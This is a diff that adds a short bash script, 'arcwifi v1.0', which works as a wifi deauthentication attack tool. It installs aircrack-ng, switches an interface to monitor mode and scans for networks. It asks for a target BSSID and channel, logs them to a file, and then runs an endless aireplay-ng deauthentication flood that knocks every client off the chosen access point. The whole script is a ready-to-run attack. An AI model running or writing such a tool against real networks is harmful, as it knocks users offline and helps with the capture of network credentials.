@@ -1,0 +1,53 @@
+#!/bin/bash
+
+
+apt install aircrack-ng
+clear
+echo "[Deauth Sender]===================]"
+read -p "please insert your wifi interface : " itf;
+read -p "please reinsert your wifi interface >>with mon<< : " itd;
+airmon-ng start $itf
+
+clear
+
+echo "[info] press Ctrl + C to stop dumping mode"
+read stop
+
+clear
+
+airodump-ng $itd
+echo "[target selector]=================]"
+read -p "please insert target bssid : " bssid;
+read -p "please insert target channel : " channel;
+
+clear
+
+echo "[target bssid : $bssid ] [ target channel : $channel ]" > leastest_hacking_data.txt 
+
+echo "[info] press Ctrl + C to stop host checking mode"
+read stop
+
+echo "[info] press Ctrl + C again to start attack"
+read stl
+
+airodump-ng --bssid $bssid -c $channel $itd
+
+clear
+
+aireplay-ng -0 0 -a $bssid $itd
+
+airmon-ng stop $itd
+
+clear
+echo "================================"
+echo arcwifi v1.0 by ARC developer    ]
+echo "================================"
+
+
+echo "Thanks for using this tools:)"
+echo "Sayonara~"
+
+
+
+
+
